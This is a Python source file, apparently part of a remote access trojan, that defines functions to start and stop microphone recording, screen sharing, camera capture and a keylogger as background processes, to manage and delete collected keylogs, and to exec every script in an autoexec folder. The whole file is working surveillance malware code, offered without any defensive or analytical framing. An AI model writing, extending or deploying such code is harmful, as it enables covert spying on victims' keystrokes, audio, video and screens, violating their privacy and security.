import os
import sys
import socket
import time
import threading
import subprocess
import shutil

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
sys.path.append('../')


from multiprocessing import Process
from subprocess import Popen, PIPE

from io import StringIO
from configuration import *
from constants import *

def import_try(array):
    """ Imports a series of not-promisable imports and tries them! """

    for item in array:
        try:
            exec("import {item}".format(
                item = item
            ))
        except Exception as error:
            dprint("Error importing library: {error}".format(error = str(error)))

### There are certain imports that must be catched if they do not yield the correct dependencies
#imports = [
#    "screen_server"
#]

#import_try(imports)
###


# Cheap ways of storing variables.
# Again, a class should have been used.
AUTOMATIC_STR_PROCESS = True

fconnfd = ""
connfd = ""

def global_connfd(_connfd):
    global connfd # Cheap way to make it global
    connfd = _connfd

def autoexec():
    for f in os.listdir("autoexec/"):
        if (f.split(".")[-1] == "py"):
           exec(open("autoexec/{file}".format(file = f)).read())
    pass


def auto_str():
    """ This function will toggle the automatic string parsing by the command_process() function """
    AUTOMATIC_STR_PROCESS = not AUTOMATIC_STR_PROCESS


# Microphone functions
def start_mic():
    try:
        p = Process(target = mic_server.main)
        p.start()
        print("Mic process has started.")
        globals()["mic_process"] = p
    except Exception as error:
        dprint(str(error))

def stop_mic():
    globals()["mic_process"].terminate()
    print("Microphone process has been killed.")

# Screen sharing functions!
def start_screen(fps=SCREEN_VIEW_FPS, 
                compression_level = SCREEN_COMPRESSION_LEVEL, 
                monitor_number = 1):
    try:
        p = Process(target = screen_server.main, args = (fps, compression_level, monitor_number,))
        p.start()
        print("Screen process has started.")
        globals()["screen_process"] = p
    except Exception as err:
        dprint(str(err))

def stop_screen():
    globals()["screen_process"].terminate()
    print("Screen process has been killed.")


# Camera functions

def start_camera():
    try:
        p = Process(target = camera_server.main, args = ())
        p.start()
        print("Camera process has started.")
        globals()["camera_process"] = p
    except Exception as err:
        print(str(err))

def stop_camera():
    globals()["camera_process"].terminate()
    print("Camera process has been killed.")



# Keylogging functions
def start_keylog():
    # I had to do this
    # It works, though. So that's good.

    p = subprocess.Popen("python3 keylogger.py", shell = True)
    globals()["keylogger_process"] = p

def stop_keylog():
    globals()["keylogger_process"].kill()

def cd_keylogs():
    os.chdir(KEYLOGGER_FOLDER_LOCATION)

def clear_keylogs(confirm = False):
    if (not confirm):
        print("Please pass confirm in the arguments (confirm=True) to confirm your request to delete all of the keylogs.")
        return
    
    print("Deleting all of the keylogs!")
    shutil.rmtree(KEYLOGGER_FOLDER_LOCATION)



    

